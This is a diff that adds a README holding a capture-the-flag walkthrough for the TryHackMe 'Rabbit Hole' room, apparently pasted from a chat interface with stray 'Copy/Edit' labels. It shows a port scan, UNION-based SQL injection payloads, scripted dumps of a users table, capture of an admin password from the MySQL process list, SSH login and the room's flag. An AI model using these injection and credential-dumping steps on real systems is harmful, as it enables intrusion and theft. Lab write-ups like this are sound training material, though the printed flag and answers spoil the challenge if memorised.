@@ -1,3 +1,7 @@
+✅ Final README.md After Conflict Resolution
+markdown
+Copy
+Edit
 # TryHackMe: Rabbit Hole Walkthrough — Full Exploit & Capture-the-Flag Guide
 
 ## 🔍 Challenge Overview
@@ -17,3 +21,125 @@
 
 ```bash
 nmap -T4 -n -sC -sV -Pn -p- 10.10.173.12
+Discovered Open Ports:
+
+22/tcp (SSH)
+
+80/tcp (HTTP)
+
+Visit:
+
+cpp
+Copy
+Edit
+http://10.10.173.12
+Identified login/register form and "Last Logins" feature reflecting usernames (possible injection point).
+
+🧪 Step 2: SQL Injection Detection
+Test Payload:
+
+sql
+Copy
+Edit
+' UNION SELECT 1;--
+Error Response: Column mismatch confirms SQL injection is possible.
+
+Working Payload:
+
+sql
+Copy
+Edit
+' UNION SELECT 1,2;--
+This confirms 2 columns are expected.
+
+🧬 Step 3: Extract Database Names
+bash
+Copy
+Edit
+python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(schema_name) FROM information_schema.schemata'
+Result:
+
+Copy
+Edit
+information_schema,web
+🗂 Step 4: Extract Table Names from web
+bash
+Copy
+Edit
+python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema="web"'
+Tables Found: users, logins
+
+🧱 Step 5: Extract Columns from users
+bash
+Copy
+Edit
+python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema="web" AND table_name="users"'
+Columns: id, username, password, group
+
+🔐 Step 6: Dump User Data
+bash
+Copy
+Edit
+python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(id,":",username,":",password,":",`group` SEPARATOR "\n") FROM web.users WHERE id<4'
+Dumped:
+
+ruby
+Copy
+Edit
+1:admin:0e3ab8...:admin
+2:foo:abc123:user
+3:bar:iloveyou:user
+👁️ Step 7: Monitor PROCESSLIST for Admin Password
+Repeatedly run:
+
+bash
+Copy
+Edit
+python3 processlist_extractor.py 'http://10.10.173.12/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'
+Target Output Example:
+
+sql
+Copy
+Edit
+SELECT * FROM users WHERE username='admin' AND password=md5('fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q')
+Extract the cleartext password inside the md5() function.
+
+💻 Step 8: SSH Login as Admin
+bash
+Copy
+Edit
+ssh admin@10.10.173.12
+Password:
+
+nginx
+Copy
+Edit
+fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q
+🏁 Step 9: Capture the Flag
+bash
+Copy
+Edit
+ls
+cat flag.txt
+Flag:
+
+Copy
+Edit
+THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}
+🧰 Tools & Techniques Used
+nmap, curl, Burp Suite
+
+Manual SQL injection testing
+
+information_schema enumeration
+
+MySQL PROCESSLIST query leakage
+
+Python scripting (requests, bs4)
+
+📁 Included Scripts
+sqli_automate2.py
+Automates 16-character chunked SQL data extraction using SUBSTR.
+
+processlist_extractor.py
+Multi-threaded script to capture live SQL queries from MySQL information_schema.processlist.
